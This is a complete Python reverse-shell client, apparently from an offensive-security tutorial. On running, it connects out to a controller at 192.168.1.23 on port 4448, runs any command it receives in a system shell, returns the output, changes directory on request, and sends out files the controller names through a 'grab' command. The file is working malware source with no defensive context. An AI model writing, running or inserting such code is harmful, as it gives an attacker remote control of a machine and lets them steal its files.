#  grab with navigation reverse tcp
import socket
import subprocess
import os

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
        f.close()
    else:
        s.send('Unable to find out the file'.encode())

def connect():
    s = socket.socket()
    s.connect(('192.168.1.23', 4448))
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab, path = command.decode().split('*')
            try:
                transfer(s, path)
            except Exception as e:
                s.send(str(e).encode())
                pass
        elif 'cd' in command.decode():
            code, directory = command.decode().split('*')
            try:
                os.chdir(directory)
                s.send(('[+] CWD is ' + os.getcwd()).encode())
            except Exception as e:
                s.send(('[-]  ' + str(e)).encode())
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()

main()

